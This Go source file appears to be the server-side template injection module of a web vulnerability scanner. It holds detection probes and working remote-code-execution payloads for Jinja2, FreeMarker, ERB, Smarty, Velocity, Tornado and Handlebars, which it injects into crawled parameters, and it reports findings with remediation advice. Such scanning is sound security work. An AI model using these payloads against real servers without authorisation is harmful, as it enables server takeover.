package ssti

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

var detectionProbes = []struct {
	payload  string
	expected string
	engine   string
}{
	{"{{7*'7'}}", "7777777", "Jinja2"},
	{"{{7*7}}", "49", "Jinja2/Twig"},
	{"{{config}}", "<Config", "Jinja2"},
	{"${7*7}", "49", "FreeMarker/Mako/EL"},
	{"${{7*7}}", "49", "Tornado"},
	{"<%= 7*7 %>", "49", "ERB"},
	{"{7*7}", "49", "Smarty"},
	{"#set($x=7*7)${x}", "49", "Velocity"},
	{"{{#with 7}}{{this}}{{/with}}", "7", "Handlebars"},
	{"#{7*7}", "49", "Java EL"},
}

// rcePayloads maps detected engine → RCE payload + expected output marker
var rcePayloads = map[string][]struct {
	payload string
	marker  string
}{
	"Jinja2": {
		{
			`{{namespace.__init__.__globals__['os'].popen('id').read()}}`,
			"uid=",
		},
		{
			`{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}`,
			"uid=",
		},
		{
			`{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
			"uid=",
		},
		{
			`{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='catch_warnings'%}{{c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")}}{% endif %}{%endfor%}`,
			"uid=",
		},
	},
	"Jinja2/Twig": {
		{
			`{{7*'7'}}`,
			"7777777",
		},
		{
			`{{namespace.__init__.__globals__['os'].popen('id').read()}}`,
			"uid=",
		},
		{
			`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`,
			"uid=",
		},
	},
	"FreeMarker/Mako/EL": {
		{
			`<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`,
			"uid=",
		},
		{
			`${ex("id")}`,
			"uid=",
		},
		{
			`<#assign classloader=product.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}`,
			"uid=",
		},
	},
	"ERB": {
		{
			"<%= `id` %>",
			"uid=",
		},
		{
			"<%= IO.popen('id').read %>",
			"uid=",
		},
		{
			"<%= system('id') %>",
			"uid=",
		},
	},
	"Smarty": {
		{
			`{php}echo shell_exec('id');{/php}`,
			"uid=",
		},
		{
			`{$smarty.template_object->smarty->registered_plugins[0][0][0]->render('<script language=php>echo shell_exec(id);</script>')}`,
			"uid=",
		},
	},
	"Velocity": {
		{
			`#set($e="e")#set($x=$e.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id"))#set($o=$x.getInputStream().read())$o`,
			"uid=",
		},
	},
	"Tornado": {
		{
			`{% import os %}{{ os.popen('id').read() }}`,
			"uid=",
		},
	},
	"Handlebars": {
		{
			`{{#with "s" as |string|}}\n  {{#with "e"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub "constructor")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push "return require('child_process').execSync('id').toString()"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}`,
			"uid=",
		},
	},
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "ssti" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding
	params := collectParams(page)

	for _, p := range params {
		if ctx.Err() != nil {
			break
		}
		for _, probe := range detectionProbes {
			if ctx.Err() != nil {
				break
			}
			body, err := m.inject(ctx, page, p, probe.payload)
			if err != nil {
				continue
			}
			respStr := string(body)

			// If the expected evaluated result is absent, skip — no injection.
			if probe.expected == "" || !strings.Contains(respStr, probe.expected) {
				continue
			}
			// If the payload appears verbatim AND the result is absent elsewhere,
			// it was reflected as-is (not evaluated). Allow both to coexist: a page
			// can echo the input field AND evaluate the expression in a separate context.
			// The presence of the expected result is the authoritative signal.

			f := modules.Finding{
				Module:      "ssti",
				Severity:    modules.Critical,
				URL:         page.URL,
				Param:       p.name,
				Payload:     probe.payload,
				Evidence:    fmt.Sprintf("Expression evaluated to %q (%s)", probe.expected, probe.engine),
				Detail:      fmt.Sprintf("SSTI (%s) in parameter %q", probe.engine, p.name),
				CWE:         "CWE-94",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Never render user input through template engines; use safe APIs with sandboxing",
				Tags:        []string{"injection", "ssti", "rce-potential"},
			}
			findings = append(findings, f)

			// Attempt RCE escalation
			if rcef := m.escalateRCE(ctx, page, p, probe.engine); rcef != nil {
				findings = append(findings, *rcef)
			}
			break
		}
	}

	return findings, nil
}

func (m *Module) escalateRCE(ctx context.Context, page crawler.Page, p param, engine string) *modules.Finding {
	rceProbes, ok := rcePayloads[engine]
	if !ok {
		// Try generic Jinja2 probes for unrecognized engine variants
		rceProbes = rcePayloads["Jinja2"]
	}

	for _, rp := range rceProbes {
		if ctx.Err() != nil {
			return nil
		}
		body, err := m.inject(ctx, page, p, rp.payload)
		if err != nil {
			continue
		}
		respStr := string(body)

		if !strings.Contains(respStr, rp.marker) {
			continue
		}

		extracted := extractOutput(respStr, rp.marker)
		return &modules.Finding{
			Module:   "ssti",
			Severity: modules.Critical,
			URL:      page.URL,
			Param:    p.name,
			Payload:  rp.payload,
			Evidence: fmt.Sprintf("RCE confirmed via %s: 'id' output: %s", engine, extracted),
			Detail: fmt.Sprintf("SSTI → RCE via %s: arbitrary OS command execution confirmed. "+
				"The template engine executed 'id' and returned: %s", engine, extracted),
			CWE:         "CWE-94",
			CVSS:        10.0,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
			Confidence:  modules.Confirmed,
			Remediation: "Immediately disable template engine user-input rendering; sandbox template execution; apply input validation",
			Tags:        []string{"injection", "ssti", "rce", "confirmed-rce"},
			Extracted:   extracted,
		}
	}
	return nil
}

func extractOutput(body, marker string) string {
	idx := strings.Index(body, marker)
	if idx == -1 {
		return ""
	}
	end := idx + 200
	if end > len(body) {
		end = len(body)
	}
	raw := body[idx:end]
	// strip HTML tags
	var sb strings.Builder
	inTag := false
	for _, r := range raw {
		switch {
		case r == '<':
			inTag = true
		case r == '>':
			inTag = false
		case !inTag:
			sb.WriteRune(r)
		}
	}
	out := strings.TrimSpace(sb.String())
	if nl := strings.Index(out, "\n"); nl != -1 {
		out = out[:nl]
	}
	return out
}

func (m *Module) inject(ctx context.Context, page crawler.Page, p param, value string) ([]byte, error) {
	if p.form != nil {
		data := make(url.Values)
		for _, f := range p.form.Fields {
			if f.Name == p.name {
				data.Set(f.Name, value)
			} else if f.Value != "" {
				data.Set(f.Name, f.Value)
			} else {
				data.Set(f.Name, "test")
			}
		}
		method := strings.ToUpper(p.form.Method)
		if method == "" {
			method = "GET"
		}
		if method == "POST" {
			req, err := http.NewRequestWithContext(ctx, http.MethodPost, p.form.Action,
				strings.NewReader(data.Encode()))
			if err != nil {
				return nil, err
			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			resp, err := m.client.Do(req)
			if err != nil {
				return nil, err
			}
			return client.ReadBody(resp)
		}
		u, err := url.Parse(p.form.Action)
		if err != nil {
			return nil, err
		}
		u.RawQuery = data.Encode()
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
		if err != nil {
			return nil, err
		}
		resp, err := m.client.Do(req)
		if err != nil {
			return nil, err
		}
		return client.ReadBody(resp)
	}

	u, err := url.Parse(page.URL)
	if err != nil {
		return nil, err
	}
	q := u.Query()
	q.Set(p.name, value)
	u.RawQuery = q.Encode()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, err
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil, err
	}
	return client.ReadBody(resp)
}

type param struct {
	name  string
	value string
	form  *crawler.Form
}

func collectParams(page crawler.Page) []param {
	var params []param
	u, err := url.Parse(page.URL)
	if err == nil {
		for k, v := range u.Query() {
			val := ""
			if len(v) > 0 {
				val = v[0]
			}
			params = append(params, param{name: k, value: val})
		}
	}
	for i := range page.Forms {
		for _, f := range page.Forms[i].Fields {
			if f.Type == "hidden" || f.Type == "submit" || f.Type == "button" {
				continue
			}
			params = append(params, param{name: f.Name, value: f.Value, form: &page.Forms[i]})
		}
	}
	return params
}
